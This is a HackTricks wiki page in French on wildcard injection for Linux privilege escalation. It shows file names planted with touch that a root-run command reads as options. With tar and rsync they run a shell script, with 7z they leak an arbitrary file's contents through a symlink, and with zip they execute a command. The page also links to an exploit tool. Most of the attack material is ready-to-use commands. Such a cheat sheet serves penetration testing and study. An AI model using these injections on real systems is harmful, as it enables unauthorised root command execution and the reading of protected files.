{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## chown, chmod

Vous pouvez **indiquer quel propriétaire de fichier et quelles permissions vous souhaitez copier pour le reste des fichiers**
```bash
touch "--reference=/my/own/path/filename"
```
Vous pouvez exploiter cela en utilisant [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attaque combinée)_\
Plus d'infos dans [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Exécuter des commandes arbitraires :**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Vous pouvez exploiter cela en utilisant [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attaque tar)_\
Plus d'infos sur [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Exécuter des commandes arbitraires :**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Vous pouvez exploiter cela en utilisant [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_attaque _rsync)_\
Plus d'infos dans [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Dans **7z**, même en utilisant `--` avant `*` (notez que `--` signifie que l'entrée suivante ne peut pas être traitée comme des paramètres, donc juste des chemins de fichiers dans ce cas), vous pouvez provoquer une erreur arbitraire pour lire un fichier, donc si une commande comme celle-ci est exécutée par root :
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Et vous pouvez créer des fichiers dans le dossier où cela est exécuté, vous pourriez créer le fichier `@root.txt` et le fichier `root.txt` étant un **symlink** vers le fichier que vous souhaitez lire :
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Alors, lorsque **7z** est exécuté, il traitera `root.txt` comme un fichier contenant la liste des fichiers qu'il doit compresser (c'est ce que l'existence de `@root.txt` indique) et quand 7z lira `root.txt`, il lira `/file/you/want/to/read` et **comme le contenu de ce fichier n'est pas une liste de fichiers, il renverra une erreur** affichant le contenu.

_Davantage d'infos dans les Write-ups de la box CTF de HackTheBox._

## Zip

**Exécuter des commandes arbitraires :**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
